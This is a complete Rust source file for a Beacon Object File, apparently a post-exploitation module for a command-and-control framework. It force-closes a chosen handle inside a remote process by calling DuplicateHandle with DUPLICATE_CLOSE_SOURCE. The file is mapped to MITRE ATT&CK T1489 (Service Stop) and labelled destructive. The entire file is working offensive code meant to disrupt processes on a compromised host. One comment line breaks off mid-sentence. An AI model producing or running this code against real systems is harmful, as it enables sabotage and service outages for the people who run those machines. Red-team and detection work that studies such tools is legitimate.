//! # Process Destroy Handle BOF
//!
//! Closes a specific handle in a remote process by using `DuplicateHandle`
//! with `DUPLICATE_CLOSE_SOURCE`. This forces the target process to release
//! the specified handle, which can disrupt the process or its dependent
//! resources.
//!
//! ## MITRE ATT&CK
//! - T1489 - Service Stop
//!
//! ## Arguments
//! - `int`: Target process ID.
//! - `int`: Handle value to close in the target process.
//!
//! This BOF is **DESTRUCTIVE**. Closing handles in a remote process can cause

#![no_std]

use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE};
use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcess};
const PROCESS_DUP_HANDLE: u32 = 0x0040;
const DUPLICATE_CLOSE_SOURCE: u32 = 0x00000001;
unsafe extern "system" {
    fn DuplicateHandle(
        source_process: *mut core::ffi::c_void,
        source_handle: *mut core::ffi::c_void,
        target_process: *mut core::ffi::c_void,
        target_handle: *mut *mut core::ffi::c_void,
        desired_access: u32,
        inherit_handle: i32,
        options: u32,
    ) -> i32;
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let pid = parser.get_int() as u32;
    let handle_value = parser.get_int();

    println!("ProcessDestroy:");
    println!("  Target PID:    {}", pid);
    println!("  Handle value:  0x{:X}", handle_value);

    unsafe {
        let process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
        if process.is_null() {
            let err = GetLastError();
            eprintln!("OpenProcess failed for PID {} (0x{:X})", pid, err);
            return;
        }

        let ret = DuplicateHandle(
            process,
            handle_value as isize as *mut core::ffi::c_void,
            GetCurrentProcess(),
            core::ptr::null_mut(),
            0,
            FALSE,
            DUPLICATE_CLOSE_SOURCE,
        );

        if ret == 0 {
            let err = GetLastError();
            eprintln!(
                "DuplicateHandle failed for handle 0x{:X} in PID {} (0x{:X})",
                handle_value, pid, err
            );
        } else {
            println!(
                "Successfully closed handle 0x{:X} in PID {}.",
                handle_value, pid
            );
        }

        CloseHandle(process);
    }
}
